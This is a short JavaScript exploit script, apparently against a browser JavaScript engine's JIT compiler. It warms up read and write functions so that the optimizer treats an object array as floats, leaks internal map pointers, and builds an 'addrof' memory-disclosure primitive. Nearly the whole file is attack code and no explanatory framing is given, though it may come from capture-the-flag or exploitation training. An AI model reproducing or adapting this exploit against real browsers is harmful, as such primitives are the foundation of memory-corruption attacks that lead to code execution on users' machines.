/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function hex(val) {
  return "0x" + val.toString(16)
}

function float_func_read(a, idx) {
  for (j=0; j<10; j++) {
    j+= 2 
  }
  return a[idx]
}

function float_func_write(a, idx, val) {
  for (j=0; j<10; j++) {
    j+= 2 
  }
  a[idx] = val
  return
}

float_arr = [1.1, 2.2, 3.3]
obj = {"a": 1.1}
obj_arr = [obj, obj, obj]

// optimize float_func_read
for (i = 0; i<0x10000; i++) {
  float_func_read(float_arr, 0)
}

// optimize float_func_read
for (i = 0; i<0x10000; i++) {
  float_func_write(float_arr, 0, 1.1)
}

// get leaks
var obj_arr_map
var float_arr_map

obj_arr_map = ftoi(float_func_read(obj_arr, 1)) >> 32n
float_arr_map = obj_arr_map - 0x50n

console.log("obj_arr_map: " + hex(obj_arr_map))
console.log("float_arr_map: " + hex(float_arr_map))

function addrof(addrof_obj) {
  obj_arr[0] = addrof_obj
  address = ftoi(float_func_read(obj_arr, 0)) & 0xffffffffn
  obj_arr[0] = obj
  return address
}

testobj = {"C":1.1}
console.log(hex(addrof(testobj)))
